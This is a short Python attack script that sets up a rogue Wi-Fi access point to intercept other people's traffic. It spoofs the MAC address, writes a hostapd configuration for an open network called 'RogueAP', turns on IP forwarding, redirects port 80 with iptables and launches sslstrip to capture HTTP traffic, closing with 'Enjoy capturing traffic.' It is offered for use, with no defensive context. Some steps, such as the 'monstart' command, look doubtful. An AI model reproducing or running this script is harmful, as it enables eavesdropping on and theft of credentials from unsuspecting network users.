import subprocess

# Start monitor mode
subprocess.run(["monstart", "wlan0"])

# Change MAC address
subprocess.run(["ifconfig", "wlan0", "down"])
subprocess.run(["macchanger", "-r", "wlan0"])
subprocess.run(["ifconfig", "wlan0", "up"])

# Configure hostapd for creating the rogue AP
hostapd_conf = '''
interface=wlan0mon
driver=nl80211
ssid=RogueAP
channel=6
'''
with open("/etc/hostapd/hostapd.conf", "w") as f:
    f.write(hostapd_conf)

# Start the rogue AP
subprocess.Popen(["hostapd", "/etc/hostapd/hostapd.conf"])

# Enable IP forwarding
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

# Set up iptables for traffic redirection
subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])

# Start sslstrip to capture HTTP traffic
subprocess.Popen(["sslstrip", "-l", "8080"])

print("Rogue AP created successfully! Enjoy capturing traffic.")